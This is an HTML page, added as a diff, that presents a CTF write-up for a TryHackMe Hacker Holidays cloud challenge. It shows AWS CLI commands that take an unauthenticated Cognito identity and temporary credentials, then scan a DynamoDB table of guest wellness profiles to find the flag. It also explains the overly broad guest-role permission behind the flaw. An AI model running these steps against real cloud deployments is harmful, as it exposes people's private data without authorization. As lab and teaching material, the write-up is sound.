@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>complimentary · hackerholidays</title>
+<meta name="description" content="CTF writeup: complimentary (hackerholidays)" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css" />
+<link rel="stylesheet" href="../../css/pygments.css" />
+</head>
+<body>
+<div class="blueprint-grid" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="topbar__inner">
+    <a class="topbar__brand" href="../../index.html">
+      <span class="brand-mark">CTF</span>
+      <span class="brand-text">Writeups</span>
+    </a>
+    <div class="topbar__spacer"></div>
+    <div class="topbar__actions">
+      <a class="btn btn--ghost btn--small" href="https://aaadarsh1337.github.io/">&#8592; Portfolio</a>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups" target="_blank" rel="noopener">Repo &#8599;</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<div class="reader-layout reader-layout--static">
+  <aside class="sidebar">
+    <div class="sidebar__head">
+      <a class="btn btn--ghost btn--small" href="../../index.html">&#8592; All writeups</a>
+    </div>
+    <div class="sidebar__challenge">
+      <p class="tb-label">CHALLENGE</p>
+      <h2>complimentary</h2>
+      <p class="side-path">hackerholidays</p>
+    </div>
+    <div class="sidebar__files">
+      <p class="tb-label">FILES</p>
+      <div class="file-list"><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/complimentary/final.json" target="_blank" rel="noopener"><span class="name">final.json</span><span class="kind">json</span></a><a class="file-item readable" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/complimentary/notes.md" target="_blank" rel="noopener"><span class="name">notes.md</span><span class="kind">md</span></a></div>
+    </div>
+    <div class="sidebar__foot">
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/tree/main/hackerholidays/complimentary" target="_blank" rel="noopener">Open folder &#8599;</a>
+      <a class="btn btn--ghost btn--small sidebar-gh-btn" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/complimentary/notes.md" target="_blank" rel="noopener">View markdown &#8599;</a>
+    </div>
+  </aside>
+  <article class="reader">
+    <div class="reader__toolbar">
+      <div class="reader__crumb">
+        <span class="tb-label">READING</span>
+        <span>notes.md</span>
+      </div>
+      <a class="btn btn--ghost btn--small" href="https://github.com/aaadarsh1337/ctf-writeups/blob/main/hackerholidays/complimentary/notes.md" target="_blank" rel="noopener">Source &#8599;</a>
+    </div>
+    <div class="reader__body">
+      <div class="md-render">
+<h1 id="day-3-complimentary">Day 3 - Complimentary</h1>
+<h2 id="room-httpstryhackmecomroomhh-complimentary-05e0b604">Room: <a href="https://tryhackme.com/room/hh-complimentary-05e0b604">https://tryhackme.com/room/hh-complimentary-05e0b604</a></h2>
+<p>Hello Hackers!</p>
+<p>Welcome to Day 3 of the TryHackMe Hacker Holidays 2026 writeups.</p>
+<p>This is a cloud security challenge involving an AWS Cognito Identity Pool and a DynamoDB table.</p>
+<p>The application provides unauthenticated AWS credentials to visitors. These credentials can be used to access the resort’s guest wellness data.</p>
+<p>Looking through the application’s JavaScript reveals the Cognito Identity Pool ID and the DynamoDB table name:</p>
+<blockquote>
+<p><code>us-east-1:836c0949-292d-485b-b532-52d5ca7bb688</code></p>
+</blockquote>
+<p>The instructions indicate that the application is using AWS in the <code>us-east-1</code> region.</p>
+<p>We can request an identity from the Cognito Identity Pool:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-id<span class="w"> </span><span class="se">\</span>
+--identity-pool-id<span class="w"> </span><span class="s2">"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">"us-east-1"</span>
+</code></pre></div>
+
+<p>The command returns an <code>IdentityId</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">    </span><span class="nt">"IdentityId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8"</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Next, request temporary AWS credentials for this identity:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-credentials-for-identity<span class="w"> </span><span class="se">\</span>
+--identity-id<span class="w"> </span><span class="s2">"us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8"</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">"us-east-1"</span>
+</code></pre></div>
+
+<p>The response contains an <code>AccessKeyId</code>, <code>SecretKey</code>, and <code>SessionToken</code>. These are temporary credentials, so they should be used immediately and should not be published in a writeup.</p>
+<p>Configure the AWS CLI using the values returned by the command:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>configure
+</code></pre></div>
+
+<p>Enter the temporary access key and secret key when prompted. The session token can be set separately:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">"YOUR_SESSION_TOKEN"</span>
+</code></pre></div>
+
+<p>The table name can be found in the application:</p>
+<blockquote>
+<p><code>complimentary-GuestWellnessProfiles</code></p>
+</blockquote>
+<p>Now scan the DynamoDB table:</p>
+<div class="highlight"><pre><span></span><code>aws<span class="w"> </span>dynamodb<span class="w"> </span>scan<span class="w"> </span><span class="se">\</span>
+--table-name<span class="w"> </span><span class="s2">"complimentary-GuestWellnessProfiles"</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">"us-east-1"</span><span class="w"> </span><span class="se">\</span>
+&gt;<span class="w"> </span>final.json
+</code></pre></div>
+
+<p>The scan returns the guest profiles stored in the table. Searching the output for <code>THM{</code> reveals the flag:</p>
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">'THM{[^}]*}'</span><span class="w"> </span>final.json
+</code></pre></div>
+
+<p>The vulnerability exists because the unauthenticated guest role is allowed to perform a full DynamoDB <code>Scan</code>, even though the application is only supposed to retrieve an individual guest profile.</p>
+<p>Happy Hacking!</p>
+      </div>
+    </div>
+  </article>
+</div>
+
+</main>
+</body>
+</html>
